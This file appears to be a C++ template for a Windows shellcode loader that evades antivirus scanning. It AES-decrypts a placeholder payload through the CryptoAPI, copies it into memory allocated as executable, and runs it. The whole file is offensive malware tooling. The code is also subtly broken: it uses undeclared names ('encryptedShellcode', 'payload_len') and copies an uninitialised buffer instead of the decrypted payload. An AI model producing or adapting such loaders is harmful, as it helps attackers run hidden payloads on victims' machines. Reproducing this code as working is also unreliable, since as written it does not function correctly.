#include "stdafx.h"
#include <windows.h>
#include <iostream>


// Encrypted shellcode and cipher key obtained from AESEncrypt.py
unsigned char payload[] = "${shellcode}";
unsigned char key[] = "${key}";


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

int main(int argc, char **argv) {



	// Char array to host the deciphered shellcode
	char shellcode[sizeof encryptedShellcode];	
	

	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	
	// Allocating memory with EXECUTE writes
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copying deciphered shellcode into memory as a function
	memcpy(exec, shellcode, sizeof shellcode);

	// Call the shellcode
	((void(*)())exec)();
}
